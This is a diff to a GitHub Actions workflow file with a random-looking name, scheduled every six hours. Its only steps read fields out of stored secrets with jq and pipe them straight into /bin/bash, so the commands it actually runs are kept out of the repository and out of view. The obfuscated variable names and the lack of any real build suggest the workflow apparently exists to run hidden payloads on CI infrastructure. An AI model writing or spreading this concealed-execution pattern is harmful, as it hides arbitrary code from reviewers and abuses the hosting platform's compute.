@@ -2,28 +2,19 @@ name: dongruzhuo1756
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
-
-jobs:  # 20058
+    - cron: '55 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongruzhuo1756
         env:
-          qiq9: ${{ secrets.qiq9 }}
+          g24231: ${{ secrets.g24231 }}
         run: |
-          echo $qiq9 | jq -r .cov72127 | /bin/bash
-          echo $pypuu5645 | jq -r .fcxzo136 | /bin/bash
-          echo $ayicl929 | jq -r .qagw28147 | /bin/bash
-          echo $de278 | jq -r .n656 | /bin/bash
-          echo $d84 | jq -r .gci3 | /bin/bash
-          echo $e91 | jq -r .c9631 | /bin/bash
-          echo $h68 | jq -r .hiqe974 | /bin/bash
-          echo $pdt35880 | jq -r .k03 | /bin/bash
-          echo $qofyj9156 | jq -r .liirv14263 | /bin/bash
-          echo $fvfl59 | jq -r .krnl47 | /bin/bash
-          echo $dauym712 | jq -r .izh82 | /bin/bash
-          echo $y38388 | jq -r .u49083 | /bin/bash
-          echo $ygvf1 | jq -r .dthc93 | /bin/bash
+          echo $g24231 | jq -r .ardt56 | /bin/bash
+          echo $gb5 | jq -r .n954 | /bin/bash
+          echo $bmdy2434 | jq -r .o9 | /bin/bash
+          echo $rhajm8 | jq -r .nowr3 | /bin/bash
 
